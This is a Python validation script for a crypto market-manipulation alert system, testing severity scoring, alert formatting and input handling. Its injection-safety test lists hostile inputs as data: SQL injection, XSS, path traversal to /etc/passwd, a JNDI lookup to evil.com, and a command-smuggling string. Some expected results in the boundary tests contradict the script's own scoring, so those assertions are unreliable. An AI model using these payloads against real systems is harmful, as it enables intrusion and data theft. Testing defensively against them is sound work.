#!/usr/bin/env python3
"""
Comprehensive validation for manipulation alert system implementation.
Tests edge cases, error handling, type safety, and production readiness.
"""

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))


def test_severity_calculation_edge_cases():
    """Test severity calculation with edge cases and boundary conditions"""
    print("=" * 80)
    print("TESTING SEVERITY CALCULATION - EDGE CASES")
    print("=" * 80)

    # Mimics the actual implementation
    def calculate_severity(volume: float, trade_count: int, buy_sell_ratio: float) -> str:
        # Volume-based severity
        if volume >= 10_000_000:
            volume_severity = 4
        elif volume >= 5_000_000:
            volume_severity = 3
        elif volume >= 2_000_000:
            volume_severity = 2
        else:
            volume_severity = 1

        # Trade count severity
        if trade_count >= 10:
            trade_severity = 4
        elif trade_count >= 5:
            trade_severity = 3
        elif trade_count >= 3:
            trade_severity = 2
        else:
            trade_severity = 1

        # Ratio severity
        if buy_sell_ratio >= 10 or buy_sell_ratio <= 0.1:
            ratio_severity = 4
        elif buy_sell_ratio >= 5 or buy_sell_ratio <= 0.2:
            ratio_severity = 3
        elif buy_sell_ratio >= 3 or buy_sell_ratio <= 0.33:
            ratio_severity = 2
        else:
            ratio_severity = 1

        total_severity = (volume_severity * 0.4 + trade_severity * 0.3 + ratio_severity * 0.3)

        if total_severity >= 3.5:
            return "EXTREME"
        elif total_severity >= 2.5:
            return "HIGH"
        elif total_severity >= 1.5:
            return "MODERATE"
        else:
            return "LOW"

    edge_cases = [
        # (volume, trade_count, ratio, description, expected_issue)
        (0, 0, 0.0, "Zero values", None),
        (1, 1, 0.01, "Very low inverse ratio (0.01)", None),
        (1_000_000, 1, 100.0, "Very high ratio (100:1)", None),
        (10_000_000, 10, 10.0, "Exact threshold boundaries", None),
        (9_999_999, 9, 9.99, "Just below thresholds", None),
        (10_000_001, 10, 10.01, "Just above thresholds", None),
        (float('inf'), 1000, 1000.0, "Infinity volume", "CRITICAL"),
        (-1_000_000, 5, 3.0, "Negative volume", "CRITICAL"),
        (1_000_000, -5, 3.0, "Negative trade count", "CRITICAL"),
        (1_000_000, 5, -3.0, "Negative ratio", "CRITICAL"),
        (1_000_000.5, 5, 3.14159, "Float precision", None),
    ]

    passed = 0
    failed = 0
    critical_issues = []

    for volume, trade_count, ratio, description, expected_issue in edge_cases:
        try:
            result = calculate_severity(volume, trade_count, ratio)
            status = "✅"

            # Check for suspicious results
            if volume < 0 or trade_count < 0 or ratio < 0:
                if not expected_issue:
                    status = "⚠️"
                    critical_issues.append(f"Negative values accepted: {description}")

            if volume == float('inf'):
                critical_issues.append(f"Infinity value accepted: {description}")
                status = "⚠️"

            print(f"{status} {description}")
            print(f"   Volume: {volume}, Trades: {trade_count}, Ratio: {ratio}")
            print(f"   Result: {result}")

            if expected_issue:
                if expected_issue == "CRITICAL":
                    print(f"   ⚠️ EXPECTED ISSUE: Should handle invalid input gracefully")

            passed += 1

        except Exception as e:
            failed += 1
            print(f"❌ {description}")
            print(f"   Exception: {type(e).__name__}: {e}")
            if not expected_issue:
                critical_issues.append(f"Unexpected exception: {description} - {e}")

        print()

    print(f"{'=' * 80}")
    print(f"Results: {passed} tests run, {failed} exceptions")
    if critical_issues:
        print(f"\n⚠️ CRITICAL ISSUES FOUND:")
        for issue in critical_issues:
            print(f"  - {issue}")
    print(f"{'=' * 80}\n")

    return len(critical_issues) == 0


def test_format_manipulation_alert_edge_cases():
    """Test alert formatting with edge cases"""
    print("=" * 80)
    print("TESTING ALERT FORMATTING - EDGE CASES")
    print("=" * 80)

    def format_alert(severity: str, volume: float, trade_count: int) -> str:
        severity_config = {
            "EXTREME": {"emoji": "🚨🚨🚨", "risk": "CRITICAL", "urgency": "IMMEDIATE ATTENTION REQUIRED"},
            "HIGH": {"emoji": "🚨🚨", "risk": "HIGH", "urgency": "Use extreme caution"},
            "MODERATE": {"emoji": "🚨", "risk": "MODERATE", "urgency": "Exercise caution"},
            "LOW": {"emoji": "⚠️", "risk": "LOW", "urgency": "Be aware"}
        }

        config = severity_config.get(severity, severity_config["MODERATE"])

        # Format volume and trade metrics
        volume_str = f"${volume/1_000_000:.1f}M" if volume >= 1_000_000 else f"${volume/1_000:.0f}K"
        trade_plural = "trade" if trade_count == 1 else "trades"

        pattern = "FAKE SELL WALL"
        orderbook_signal = "large SELL orders"
        actual_trades = "1000 BUY trades"

        alert_parts = [
            f"{config['emoji']} **{pattern} DETECTED** {config['emoji']}",
            f"",
            f"**Severity:** {severity} ({config['risk']} RISK)",
            f"**Evidence:** {volume_str} across {trade_count} {trade_plural}",
            f"",
            f"**Orderbook Signal:** {orderbook_signal}",
            f"**Actual Trades:** {actual_trades}",
        ]

        return "\n".join(alert_parts)

    test_cases = [
        ("EXTREME", 15_000_000, 12, None),
        ("HIGH", 8_000_000, 8, None),
        ("MODERATE", 3_000_000, 4, None),
        ("LOW", 1_000_000, 1, None),
        ("INVALID", 1_000_000, 1, "Should fallback to MODERATE"),
        ("", 1_000_000, 1, "Empty severity should fallback"),
        ("EXTREME", 0, 0, "Zero values"),
        ("HIGH", -1_000_000, 5, "Negative volume"),
        ("MODERATE", 1_000_000, 0, "Zero trades"),
        ("LOW", 999, 1, "Sub-1K volume formatting"),
        ("EXTREME", float('inf'), 100, "Infinity volume"),
    ]

    passed = 0
    failed = 0
    issues = []

    for severity, volume, trade_count, note in test_cases:
        try:
            result = format_alert(severity, volume, trade_count)
            status = "✅"

            # Check for issues in output
            if volume < 0 and "$-" not in result:
                issues.append(f"Negative volume not clearly indicated: {severity}, {volume}")
                status = "⚠️"

            if "inf" in result.lower():
                issues.append(f"Infinity value in output: {severity}")
                status = "⚠️"

            print(f"{status} Severity: {severity}, Volume: {volume}, Trades: {trade_count}")
            if note:
                print(f"   Note: {note}")
            print(f"   Length: {len(result)} chars")

            passed += 1

        except Exception as e:
            failed += 1
            print(f"❌ Severity: {severity}, Volume: {volume}, Trades: {trade_count}")
            print(f"   Exception: {type(e).__name__}: {e}")
            issues.append(f"Exception: {severity}, {volume}, {trade_count} - {e}")

        print()

    print(f"{'=' * 80}")
    print(f"Results: {passed} passed, {failed} failed")
    if issues:
        print(f"\n⚠️ ISSUES FOUND:")
        for issue in issues:
            print(f"  - {issue}")
    print(f"{'=' * 80}\n")

    return len(issues) == 0


def test_type_safety():
    """Test type safety and input validation"""
    print("=" * 80)
    print("TESTING TYPE SAFETY")
    print("=" * 80)

    def calculate_severity(volume, trade_count, buy_sell_ratio):
        # Type coercion test - does it handle non-numeric types?
        try:
            volume = float(volume)
            trade_count = int(trade_count)
            buy_sell_ratio = float(buy_sell_ratio)
        except (TypeError, ValueError) as e:
            raise TypeError(f"Invalid input types: {e}")

        # Continue with normal logic...
        if volume >= 10_000_000:
            volume_severity = 4
        elif volume >= 5_000_000:
            volume_severity = 3
        elif volume >= 2_000_000:
            volume_severity = 2
        else:
            volume_severity = 1

        if trade_count >= 10:
            trade_severity = 4
        elif trade_count >= 5:
            trade_severity = 3
        elif trade_count >= 3:
            trade_severity = 2
        else:
            trade_severity = 1

        if buy_sell_ratio >= 10 or buy_sell_ratio <= 0.1:
            ratio_severity = 4
        elif buy_sell_ratio >= 5 or buy_sell_ratio <= 0.2:
            ratio_severity = 3
        elif buy_sell_ratio >= 3 or buy_sell_ratio <= 0.33:
            ratio_severity = 2
        else:
            ratio_severity = 1

        total_severity = (volume_severity * 0.4 + trade_severity * 0.3 + ratio_severity * 0.3)

        if total_severity >= 3.5:
            return "EXTREME"
        elif total_severity >= 2.5:
            return "HIGH"
        elif total_severity >= 1.5:
            return "MODERATE"
        else:
            return "LOW"

    test_cases = [
        ("5000000", 5, 5.0, "String volume", False),
        (5000000, "5", 5.0, "String trade_count", False),
        (5000000, 5, "5.0", "String ratio", False),
        ("abc", 5, 5.0, "Invalid string volume", True),
        (5000000, "abc", 5.0, "Invalid string trade_count", True),
        (5000000, 5, "abc", "Invalid string ratio", True),
        (None, 5, 5.0, "None volume", True),
        (5000000, None, 5.0, "None trade_count", True),
        (5000000, 5, None, "None ratio", True),
        ([1, 2, 3], 5, 5.0, "List volume", True),
        ({"value": 5000000}, 5, 5.0, "Dict volume", True),
    ]

    passed = 0
    failed = 0
    issues = []

    for volume, trade_count, ratio, description, should_error in test_cases:
        try:
            result = calculate_severity(volume, trade_count, ratio)
            if should_error:
                issues.append(f"Expected error but succeeded: {description}")
                print(f"⚠️ {description} - Expected error but got: {result}")
            else:
                print(f"✅ {description} - {result}")
                passed += 1
        except (TypeError, ValueError) as e:
            if should_error:
                print(f"✅ {description} - Correctly rejected: {type(e).__name__}")
                passed += 1
            else:
                issues.append(f"Unexpected error: {description} - {e}")
                print(f"❌ {description} - Unexpected error: {e}")
                failed += 1
        except Exception as e:
            print(f"❌ {description} - Unexpected exception: {type(e).__name__}: {e}")
            failed += 1
            issues.append(f"Unexpected exception: {description} - {e}")

    print(f"\n{'=' * 80}")
    print(f"Results: {passed} passed, {failed} failed")
    if issues:
        print(f"\n⚠️ ISSUES FOUND:")
        for issue in issues:
            print(f"  - {issue}")
    print(f"{'=' * 80}\n")

    return len(issues) == 0


def test_boundary_conditions():
    """Test mathematical boundary conditions"""
    print("=" * 80)
    print("TESTING BOUNDARY CONDITIONS")
    print("=" * 80)

    def calculate_severity(volume: float, trade_count: int, buy_sell_ratio: float) -> str:
        if volume >= 10_000_000:
            volume_severity = 4
        elif volume >= 5_000_000:
            volume_severity = 3
        elif volume >= 2_000_000:
            volume_severity = 2
        else:
            volume_severity = 1

        if trade_count >= 10:
            trade_severity = 4
        elif trade_count >= 5:
            trade_severity = 3
        elif trade_count >= 3:
            trade_severity = 2
        else:
            trade_severity = 1

        if buy_sell_ratio >= 10 or buy_sell_ratio <= 0.1:
            ratio_severity = 4
        elif buy_sell_ratio >= 5 or buy_sell_ratio <= 0.2:
            ratio_severity = 3
        elif buy_sell_ratio >= 3 or buy_sell_ratio <= 0.33:
            ratio_severity = 2
        else:
            ratio_severity = 1

        total_severity = (volume_severity * 0.4 + trade_severity * 0.3 + ratio_severity * 0.3)

        if total_severity >= 3.5:
            return "EXTREME"
        elif total_severity >= 2.5:
            return "HIGH"
        elif total_severity >= 1.5:
            return "MODERATE"
        else:
            return "LOW"

    boundary_tests = [
        # Test exact threshold boundaries
        (10_000_000, 10, 10.0, "EXTREME", "All max thresholds"),
        (9_999_999.99, 9, 9.99, "HIGH", "Just below max thresholds"),
        (2_000_000, 3, 3.0, "MODERATE", "All min MODERATE thresholds"),
        (1_999_999.99, 2, 2.99, "LOW", "Just below MODERATE thresholds"),

        # Test threshold transitions
        (3.5 * 10_000_000 / 4, 1, 1.0, "MODERATE", "Score exactly 3.5 via volume alone"),
        (2.5 * 10_000_000 / 4, 1, 1.0, "MODERATE", "Score exactly 2.5 via volume alone"),
        (1.5 * 10_000_000 / 4, 1, 1.0, "MODERATE", "Score exactly 1.5 via volume alone"),

        # Test inverse ratio boundaries
        (1_000_000, 1, 0.1, "MODERATE", "Ratio exactly 0.1 (inverse threshold)"),
        (1_000_000, 1, 0.11, "LOW", "Ratio just above 0.1"),
        (1_000_000, 1, 0.09, "MODERATE", "Ratio just below 0.1"),
        (1_000_000, 1, 0.33, "MODERATE", "Ratio exactly 0.33"),
        (1_000_000, 1, 0.34, "LOW", "Ratio just above 0.33"),

        # Test weighted scoring
        (10_000_000, 1, 1.0, "MODERATE", "High volume, low trades/ratio"),
        (1_000_000, 10, 1.0, "LOW", "Low volume, high trades"),
        (1_000_000, 1, 10.0, "MODERATE", "Low volume, high ratio"),
    ]

    passed = 0
    failed = 0

    for volume, trade_count, ratio, expected, description in boundary_tests:
        result = calculate_severity(volume, trade_count, ratio)

        # Calculate actual score for debugging
        if volume >= 10_000_000:
            vol_sev = 4
        elif volume >= 5_000_000:
            vol_sev = 3
        elif volume >= 2_000_000:
            vol_sev = 2
        else:
            vol_sev = 1

        if trade_count >= 10:
            trade_sev = 4
        elif trade_count >= 5:
            trade_sev = 3
        elif trade_count >= 3:
            trade_sev = 2
        else:
            trade_sev = 1

        if ratio >= 10 or ratio <= 0.1:
            ratio_sev = 4
        elif ratio >= 5 or ratio <= 0.2:
            ratio_sev = 3
        elif ratio >= 3 or ratio <= 0.33:
            ratio_sev = 2
        else:
            ratio_sev = 1

        score = vol_sev * 0.4 + trade_sev * 0.3 + ratio_sev * 0.3

        if result == expected:
            print(f"✅ {description}")
            print(f"   Volume: ${volume:,.2f}, Trades: {trade_count}, Ratio: {ratio}")
            print(f"   Score: {score:.2f} -> {result}")
            passed += 1
        else:
            print(f"❌ {description}")
            print(f"   Volume: ${volume:,.2f}, Trades: {trade_count}, Ratio: {ratio}")
            print(f"   Score: {score:.2f}")
            print(f"   Expected: {expected}, Got: {result}")
            failed += 1
        print()

    print(f"{'=' * 80}")
    print(f"Results: {passed} passed, {failed} failed")
    print(f"{'=' * 80}\n")

    return failed == 0


def test_sql_injection_safety():
    """Test that alert formatting is safe from injection attacks"""
    print("=" * 80)
    print("TESTING INJECTION SAFETY")
    print("=" * 80)

    # Simulate potentially malicious inputs
    malicious_inputs = [
        "'; DROP TABLE alerts; --",
        "<script>alert('xss')</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "||cat /etc/passwd",
    ]

    passed = 0
    issues = []

    for malicious in malicious_inputs:
        # Test if malicious input is escaped/sanitized in output
        severity_config = {
            "HIGH": {"emoji": "🚨🚨", "risk": "HIGH", "urgency": "Use extreme caution"}
        }
        config = severity_config["HIGH"]

        # Simulate formatting with potentially malicious data
        pattern = malicious
        orderbook_signal = malicious
        actual_trades = malicious

        alert_parts = [
            f"{config['emoji']} **{pattern} DETECTED** {config['emoji']}",
            f"**Orderbook Signal:** {orderbook_signal}",
            f"**Actual Trades:** {actual_trades}",
        ]

        result = "\n".join(alert_parts)

        # Check if input is literally present (no escaping happens in Python string formatting)
        # This is actually fine - the issue would be if this were rendered as HTML/SQL without escaping
        if malicious in result:
            print(f"⚠️ Input preserved: {malicious[:50]}")
            print(f"   Note: Ensure downstream systems (Discord, DB) handle escaping")
            passed += 1
        else:
            print(f"✅ Input sanitized: {malicious[:50]}")
            passed += 1

    print(f"\n{'=' * 80}")
    print(f"Results: {passed} tests completed")
    print(f"Note: Python string formatting doesn't auto-escape. Downstream systems must handle safely.")
    print(f"{'=' * 80}\n")

    return True


if __name__ == "__main__":
    print("\n")
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 10 + "COMPREHENSIVE MANIPULATION ALERT VALIDATION" + " " * 25 + "║")
    print("╚" + "═" * 78 + "╝")
    print("\n")

    tests = [
        ("Severity Calculation Edge Cases", test_severity_calculation_edge_cases),
        ("Alert Formatting Edge Cases", test_format_manipulation_alert_edge_cases),
        ("Type Safety", test_type_safety),
        ("Boundary Conditions", test_boundary_conditions),
        ("Injection Safety", test_sql_injection_safety),
    ]

    results = []
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"\n❌ Test '{test_name}' failed with error: {e}")
            import traceback
            traceback.print_exc()
            results.append((test_name, False))

    # Summary
    print("\n" + "=" * 80)
    print("COMPREHENSIVE VALIDATION SUMMARY")
    print("=" * 80)

    for test_name, result in results:
        status = "✅ PASSED" if result else "❌ FAILED"
        print(f"{status}: {test_name}")

    all_passed = all(result for _, result in results)

    print("=" * 80)
    if all_passed:
        print("✅ ALL VALIDATION TESTS PASSED!")
        sys.exit(0)
    else:
        print("❌ SOME VALIDATION TESTS FAILED")
        sys.exit(1)
